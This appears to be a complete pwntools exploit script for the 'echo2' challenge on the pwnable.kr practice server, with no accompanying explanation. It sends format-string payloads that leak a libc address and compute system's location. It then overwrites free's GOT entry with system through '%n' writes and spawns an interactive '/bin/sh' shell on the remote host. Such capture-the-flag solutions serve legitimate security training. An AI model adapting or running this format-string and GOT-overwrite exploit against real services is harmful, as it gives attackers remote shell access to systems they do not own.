from pwn import * 

#sh = process("./echo2") 

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
sh = remote("pwnable.kr",9011) 
#libc = ELF("bf_libc.so") 

def change_addr(addr, value) : 
    print sh.recvuntil("> ") 
    sh.sendline("2") 
    print sh.recv() 
    payload = "%" + str(value)   
    if len(str(value)) > 2 : 
        payload +=   "x%8$naaaaa" +  p64(addr)
    else : 
        payload += "x%7$n" +  p64(addr) 
    sh.sendline(payload) 

#start 
print sh.recv() 
sh.sendline("hiep") 


print sh.recvuntil("> ") 
sh.sendline("2") 
print sh.recv()

# leak libc address  
sh.sendline("%19$p")  # address of libc_start_main + 231  
libc_start_main = eval(sh.recvline()) - 231 
libc.address = libc_start_main - libc.sym['__libc_start_main']  
system = libc.sym['system'] 
log.success("libc_start_main addr = " + hex(libc_start_main))
log.success("libc addr = " + hex(libc.address)) 
log.success("system addr = " + hex(system)) 

# change free.got -> system 
raw_input("DEBUG") 
system = p64(system) 
free = 0x602000 
from time import sleep 
for i in range(3) : 
    print i 
    sleep(0.1) 
    change_addr(0x602000 + 2*i,u16(system[2*i:2*i+2]))   
print "lol",sh.recv() 
sh.sendline("3") 
sleep(0.1) 
sh.sendline("/bin/sh\0") 

sh.interactive()
